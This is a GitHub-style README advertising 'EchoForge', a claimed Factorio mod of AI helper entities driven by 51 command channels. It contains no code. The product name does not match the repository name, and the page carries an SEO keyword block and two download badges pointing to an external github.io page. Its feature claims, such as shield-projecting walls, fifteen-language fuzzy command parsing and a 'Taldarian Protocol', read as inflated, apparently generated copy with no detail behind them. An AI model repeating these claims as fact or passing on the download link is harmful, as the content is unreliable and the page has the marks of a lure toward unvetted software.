![preview](https://raw.githubusercontent.com/pmakasa11-star/factorio-ai-legion/main/poster_e0cb6d.svg)

# EchoForge — The Living Blueprint Engine

EchoForge is not another mod manager, not another automation toolkit, and certainly not a simple scripting wrapper. It is a **self-organizing construction ecosystem** for Factorio 2.x that transforms the way you perceive your factory's intelligence. Imagine your base as a living organism, where every assembler, every inserter, and every train stop has a voice—and EchoForge gives that voice a mouth, a memory, and a will. Born from the desire to push beyond static blueprints, EchoForge spawns AI-driven "Forge Echoes" — autonomous helper entities that respond to 51 distinct command channels, turning your factory from a passive machine into an active collaborator.

This project redefines the boundary between player and factory. With EchoForge, you do not simply place buildings; you **negotiate with a workforce** that learns, adapts, and executes complex multi-step operations. Whether it’s orchestrating a 10,000-unit mining operation, dynamically re-routing logistics during a biter siege, or crafting a symphony of interlocking assembly lines, EchoForge acts as your industrial co-pilot. Each Echo is a persistent procedural agent, capable of understanding context, prioritizing tasks, and reporting back through a rich telemetry stream.

---

## Overview 🧠

EchoForge exists to solve the chronic problem of **mid-to-late-game micromanagement burnout**. When a factory grows beyond 500 entities, the human factor becomes the bottleneck. EchoForge replaces manual routine with **conversational control** — you issue high-level directives, and the Echoes handle the granular execution through a sophisticated command architecture exposed via RCON.

The mod introduces a novel concept: **the Taldarian Protocol**, a communication standard that allows your commands to be interpreted not as rigid instructions but as *intent expressions*. This means Echoes can infer missing parameters, prioritize conflicting goals, and even propose alternative construction orders based on resource availability. The result is a seamless, responsive, and remarkably human-like companion system that elevates Factorio from a game of logistics to a game of leadership.

Unlike static blueprint books or simple bots, EchoForge’s Echoes are **persistent and contextual**. They maintain spatial awareness, remember task histories, and can be assigned territories. They communicate via an in-game terminal overlay, using a heat-map visualization to show you where their attention is focused. This is the closest Factorio has come to having a true digital workforce.

---

## Getting Started ✨

Embarking with EchoForge is straightforward, but its depth will demand your attention. The mod is designed for players who have already tasted the complexity of megabase construction and desire a smarter way to expand.

[![Download](https://raw.githubusercontent.com/pmakasa11-star/factorio-ai-legion/main/go_b7b9c.svg)](https://pmakasa11-star.github.io/factorio-ai-legion/)

The core setup involves placing the mod into your Factorio 2.x mod directory and enabling it in your save. Upon your next load, you will find a new "Forge Console" icon in your toolbar. Opening it reveals the command registry, a list of all 51 operational channels, each with its own syntax, scope, and unique passive cooldown. We recommend starting with the `probe` command (channel 01) to assess your current factory's health, followed by `direct-assemble` for a logical first controlled action.

### Initial Configuration

EchoForge ships with a sensible default configuration that balances autonomy with player control. However, for those who want to fine-tune the experience, the `forge_global.lua` file offers a treasure trove of adjustable parameters: from Echo population limits (soft cap at 12, hard cap at 24) to the frequency of telemetry pings. We highly recommend adjusting the `interference_threshold` setting—this governs how aggressively Echoes will ask for permission before acting on ambiguous commands. A lower threshold yields more conversational control; a higher threshold enables more dormant automation.

---

## Why EchoForge? 🤔

Factorio modding has seen countless attempts at automation—from recursive blueprints to logic-bot frameworks—but all of them suffer from the same flaw: they treat the factory as a static structure. EchoForge treats it as a **dynamic society of processes**. The mod’s architectural core is built on two pillars:

1. **Temporal Concurrency**: Echoes do not execute commands sequentially. Each Echo runs a lightweight virtual machine that manages its own task queue, allowing for parallel operations. You can have a mining Echo extracting ore while a crafting Echo builds belts, all without colliding or causing deadlock.

2. **Predictive Resource Mapping**: The mod continuously samples your logistics network and generates a "resource pressure chart". This chart is fed into every command execution. For example, an `extend-rail` command will automatically avoid placing rails over planned future ore deposits if the pressure chart indicates a bottleneck in that area.

The driving philosophy is **cooperation over instruction**. Instead of you telling the Echo *exactly* where to place a miner, you express the goal: "maximize output from this ore field", and the Echo uses its local intelligence to select the most efficient layout. This reduces command verbosity by up to 80% and dramatically lowers the learning curve for complex operations.

### The 51 Command Landscape

Here’s a glimpse into the command architecture. The channels are grouped into five distinct operational families:

- **Movement & Navigation (Channels 01-09)**: Includes `patrol` with waypoint interpolation, `caravan` for bulk transport of items, and `scent-trail` which allows an Echo to follow a virtual "aroma" of resources across a long distance.
- **Extraction & Logistics (10-21)**: Commands like `deep-mine` (which prioritizes high-yield nodes) and `sanitize-belt` (which removes jammed items) fall here.
- **Construction & Expansion (22-35)**: Focuses on assembling new infrastructure. `crystal-wall` is a standout feature—it builds energy-sigiled walls that double as low-level shield projectors.
- **Combat & Defense (36-45)**: Includes `micro-fortify` for emergency pillboxes, and `scorched-earth` for area denial using a staggered flame/acid trap matrix.
- **Communication & Telemetry (46-51)**: These are the "meta" commands for managing Echoes themselves, including `echo-meld` to merge two Echoes into a more powerful form, and `viral-share` to broadcast a learned pattern to the entire Echo population.

---

## Feature Highlights 🔥

### 1. Responsive Command Interface
The Forge Console is fully responsive, meaning it adapts to split-screen play, minimap anchoring, and even low-resolution displays. The command input uses a syntax parser that accepts typos and fuzzy phrasing. Typing "pls drill that iron" will correctly invoke the `extract-ore` channel with a target pitch of `iron`.

### 2. Multilingual Command Recognition 🌐
Recognizing that Factorio has a global community, EchoForge’s language engine supports 15 distinct languages out-of-the-box, including English, German, Russian, Chinese, Japanese, and Portuguese. You can even mix languages in a single command sequence. The translation layer is built from a custom lexicon that prioritizes industrial terminology, ensuring "build a wall" in any language translates to a secure construction plan.

### 3. Always-On Support & Diagnostics ⚕️
The mod is designed to be self-diagnosing. A built-in "Operation Sanctum" log records every command execution, resource transaction, and pathfinding decision. If an Echo fails to complete a task, you will receive a **non-intrusive holographic report** in the corner of your screen, suggesting possible root causes (e.g., "Resource shortage: copper plate" or "Terrain obstruction: water"). This 24/7 support loop ensures you never lose time to debugging your factory’s behavior.

### 4. Security-Minded Echo Control
We understand that an autonomous agent is a fascinating toy, but a dangerous tool. Every command that involves destroying entities (channels 36-45) requires an **explicit double-command** confirmation, unless you deliberately open the "Total Safety Bypass" bypass panel, which is disabled by default and locked behind a 5-minute cooldown.

### 5. Dynamic Visual Feedback
Forge Echoes project a subtle holographic grid onto the ground delineating their current task area. This overlays are color-coded: blue for construction, amber for mining, red for combat, and green for telemetry reporting. This allows you to read your factory’s activity at a glance, turning the map into a living dashboard.

---

## SEO & Integration Keywords 📈

For those searching for the ultimate companion mod, EchoForge delivers on all fronts. It offers a **advanced AI companion for Factorio**, **autonomous building automation**, **RCON command orchestration**, and a **dynamic workforce management system**. While searching for "Factorio player assistants" or "smart logistics mod," EchoForge stands out as a definitive solution.

---

## Technical Architecture 🏗️

The mod is written in Lua, leveraging the Factorio 2.5 API for entity handling and event tick processing. The heart of the system is a **distributed messaging bus** that exists within the game’s memory space. It does not render any external UI except the essential console overlay to keep the game's rendering pipeline clean.

Every Echo instance is a table-driven state machine. The state machine transitions are processed at a configurable tick rate (default 12 ticks per second). This keeps CPU overhead low even when running 24 active Echoes. The mod’s memory footprint is optimized to remain under 1% of the game’s usual memory usage.

### Forge-Precated Pattern Libraries
EchoForge is built to be extensible. The command framework relies on **discovery queues** where you can register new command channels through a robust Lua API if you want to build your own automation scripts. The internal documentation (accessible via channel 51) provides hooks and examples for the ambitious modder.

---

## Installation Roadmap 🧭

Your first launch with EchoForge might seem overwhelming, but the initial setup is designed to be gentle.

1. **Import the mod** into your mod manager. The game will prompt a restart.
2. **Open the Forge Console** (default keybind: `Shift+F`). Run `diagnostics` to initialize the Echo database.
3. **Create your first Echo**. Use `summon-echo` and specify a name (e.g., "ForgeSage").
4. **Give a simple command**. Start with `inspect-area` to have your Echo analyze the immediate vicinity and report what is constructed.
5. Observe the telemetry. As you get comfortable, gradually layer in more complex instructions.

The learning curve is intentionally paced. We encourage you to start with low-autonomy operations (interference_threshold = 1.0) before trusting your Echoes with high-stakes building projects.

---

## Usage Examples 📦

**Example 1: Automated Outpost Defense**
1. Use `summon-echo` to create "Sentinels".
2. Issue `patrol` with coordinates for a perimeter.
3. Follow up with `set-trigger` and type "biter proximity > 20".
4. Issue `micro-fortify` with a region argument.
5. Your Sentinels will now automatically erect defensive structures when threats are detected.

**Example 2: Resource Rebalancing**
1. Prepare two Echoes, "Collector" and "Builder".
2. On `Collector`, issue `dynamic-haul` with a source and target chest.
3. On `Builder`, issue `craft-queue` with a recipe list requiring iron plates.
4. The `viral-share` command on either Echo can then synchronize priorities, so `Collector` prioritizes moving iron if `Builder` reports a shortage.

---

## Troubleshooting & Common Pitfalls 🛠️

**Symptom**: Echoes ignore movement commands.
**Cause**: The `interference_threshold` is too low, and the Echo is waiting for permission.
**Solution**: Adjust the threshold in the config file or issue an `override-permission` command.

**Symptom**: Telemetry overlays show "fuzzy" navigation paths.
**Cause**: Your factory’s belt network is overcrowded; Echoes are computing alternative paths.
**Solution**: Run `sanitize-logistics` to clear jams and re-issue your directive.

**Symptom**: The Forge Console does not render.
**Cause**: The "Operation Sanctum" log is full.
**Solution**: Clear the log via channel 51 (`purge-log`) and restart your save.

**Symptom**: Language parser fails on non-Latin characters.
**Cause**: You are running a version of the game that does not support Unicode; update your Factorio version to 2.5.2 or later.

---

## Community & Contribution 🤝

EchoForge grew from a passion for turning daunting logistics into a playground for automation. The project welcomes contributors who want to add more command channels, refine the language engine, or visualize data in new ways. You can extend the mod, translate it to additional languages, and report encounter bugs through the repository’s issue tracker. However, please note that the core development team follows a strict "Isolation First" policy—we prefer feature additions that do not rely on other mods for core functionality.

---

## License 📄

EchoForge is released under the MIT License. This permissive license allows you to use, modify, and distribute the mod for any purpose, provided you retain the original copyright notice and disclaimer. For commercial usage, the MIT License allows it, but we ask that you consider attributing the mod’s origin in your documentation. You can review the full legal text in the repository.

[License Link](LICENSE)

---

## Disclaimer 🛑

EchoForge is a fan-made project and is not affiliated with Wube Software, the creators of Factorio. The mod operates within the boundaries of the official modding API and is intended to complement, not replace, the base game experience. Developers make no guarantee regarding the mod’s fitness for any particular purpose. By downloading and using EchoForge, you accept that the developers are not responsible for any data loss, save file corruption, or game instability that may result from misconfiguring the mod’s deeper command channels. Use the combat automation features responsibly. The mod is continuously evolving; check the repository for the latest updates and changelogs. This mod does not violate any terms of service and adheres to the spirit of Factorio’s modding guidelines.

---

## Final Thoughts 💎

EchoForge is about replacing the grind of manual management with the joy of strategic delegation. It offers a new lens through which to view your growing industrial empire — not as a heap of machines, but as a cohesive, thinking entity. We invite you to explore the 51 command channels, break them, remix them, and find new ways to orchestrate your factory’s destiny. Because in the world of EchoForge, the factory does not just grow; it **learns how to grow itself**.

[![Download](https://raw.githubusercontent.com/pmakasa11-star/factorio-ai-legion/main/go_b7b9c.svg)](https://pmakasa11-star.github.io/factorio-ai-legion/)